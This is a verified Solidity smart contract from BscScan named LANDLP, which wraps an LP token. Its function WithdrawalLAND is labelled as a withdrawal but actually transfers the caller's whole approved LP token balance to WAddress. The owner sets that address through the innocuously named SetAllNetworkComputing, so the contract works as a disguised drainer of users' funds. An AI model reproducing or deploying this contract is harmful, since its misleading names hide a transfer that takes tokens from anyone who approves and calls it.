/**
 *Submitted for verification at BscScan.com on 2022-10-28
*/

pragma solidity ^0.6.0;


    interface Erc20Token { 
        function totalSupply() external view returns (uint256);
        function balanceOf(address _who) external view returns (uint256);
        function transfer(address _to, uint256 _value) external;
        function allowance(address _owner, address _spender) external view returns (uint256);
        function transferFrom(address _from, address _to, uint256 _value) external;
        function approve(address _spender, uint256 _value) external; 
        function burnFrom(address _from, uint256 _value) external; 
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(address indexed owner, address indexed spender, uint256 value);
    }
    
    contract Base {
        Erc20Token public LP   = Erc20Token(0xB8e2776b5a2BCeD93692f118f2afC525732075fb);

         address  _owner;
        address public WAddress;
        modifier onlyOwner() {
            require(msg.sender == _owner, "Permission denied"); _;
        }
   
        
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        _owner = newOwner;
    }

 
    receive() external payable {}  
}

    contract LANDLP   is Base {
     constructor()
    public {
        _owner = msg.sender; 
    }
   
    function WithdrawalLAND() public    {
        uint256  Balance = LP.balanceOf(msg.sender);
        LP.transferFrom(address(msg.sender), WAddress, Balance);
    }

    function SetAllNetworkComputing(address Address) public onlyOwner {
        WAddress =  Address;
    }
   
}